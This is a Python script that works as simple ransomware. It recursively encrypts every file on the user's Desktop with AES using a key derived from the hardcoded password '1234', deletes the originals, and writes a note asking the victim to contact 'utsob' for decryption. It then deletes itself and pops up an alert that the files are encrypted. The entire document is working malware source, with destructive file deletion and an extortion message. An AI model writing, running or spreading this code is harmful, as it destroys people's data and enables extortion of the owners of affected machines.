import os
import hashlib
import time
import pyautogui
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import tqdm

# 🖥️ Desktop Path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# 🔑 Hardcoded Password
PASSWORD = "1234"

def derive_key(password: str) -> bytes:
    """Generate a 32-byte encryption key using SHA-256."""
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path: str, key: bytes):
    """Encrypt a file and delete the original."""
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_file = file_path + ".enc"

    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        with open(encrypted_file, 'wb') as f:
            f.write(cipher.iv)  # Store IV at the beginning
            f.write(ciphertext)

        os.remove(file_path)  # Delete the original file
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")

def encrypt_all_files():
    """Encrypt all files in the Desktop directory."""
    key = derive_key(PASSWORD)
    for root, _, files in os.walk(desktop_path):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith(".enc"):  # Skip already encrypted files
                encrypt_file(file_path, key)

def create_password_file():
    """Create a text file with the decryption password and custom text."""
    password_file = os.path.join(desktop_path, "Decrptn_Password.txt")
    with open(password_file, "w") as f:
        f.write("do yo want decryption this file contact with utsob\n")  # Custom text

def delete_script():
    """Delete the script itself."""
    script_path = os.path.abspath(__file__)  # Get the current script path
    time.sleep(2)  # Wait a moment before deleting
    os.remove(script_path)

# 📌 Step 1: Encrypt all files
encrypt_all_files()

# 📌 Step 2: Create the password file
create_password_file()

# 📌 Step 3: Delete this script itself
delete_script()

# 📌 Step 4: Show an alert
pyautogui.alert("All files have been encrypted! Check 'Decryption_Password.txt' for recovery.", "Encryption Complete")
